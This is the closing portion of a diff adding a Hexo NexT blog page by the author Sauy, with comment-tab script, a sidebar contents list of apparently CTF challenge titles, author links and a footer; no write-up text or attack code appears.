+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-check"><span class="nav-number">1.</span> <span class="nav-text">ez_check</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8B%97%E9%BB%91%E5%AD%90%E7%9A%84%E5%8F%98%E9%87%8F"><span class="nav-number">2.</span> <span class="nav-text">狗黑子的变量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8B%97%E9%BB%91%E5%AD%90%E7%9A%84%E9%9A%90%E8%97%8F"><span class="nav-number">3.</span> <span class="nav-text">狗黑子的隐藏</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E7%9A%84%E9%93%BE%E5%AD%90"><span class="nav-number">4.</span> <span class="nav-text">简单的链子</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E4%B9%8B%E7%8E%8B"><span class="nav-number">5.</span> <span class="nav-text">渗透之王</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9C%9F%E5%81%87ECR"><span class="nav-number">6.</span> <span class="nav-text">真假ECR</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nukaka-ser2"><span class="nav-number">7.</span> <span class="nav-text">nukaka_ser2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ghost-render"><span class="nav-number">8.</span> <span class="nav-text">ghost_render</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rce%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F"><span class="nav-number">9.</span> <span class="nav-text">rce命令执行系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyRead"><span class="nav-number">10.</span> <span class="nav-text">easyRead</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E8%BF%90%E7%9F%B3%E4%B9%8B%E9%97%A8"><span class="nav-number">11.</span> <span class="nav-text">命运石之门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%A0%E4%B9%9F%E7%8E%A9%E9%93%B2%E5%90%97"><span class="nav-number">12.</span> <span class="nav-text">你也玩铲吗</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Sauy"
+      src="/images/2.png">
+  <p class="site-author-name" itemprop="name">Sauy</p>
+  <div class="site-description" itemprop="description">VENI,VEDI,VICI</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://space.bilibili.com/415414982?spm_id_from=333.1387.0.0" title="Bilibili → https:&#x2F;&#x2F;space.bilibili.com&#x2F;415414982?spm_id_from&#x3D;333.1387.0.0" rel="noopener" target="_blank"><i class="tv-retro fa-fw"></i>Bilibili</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sauy</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
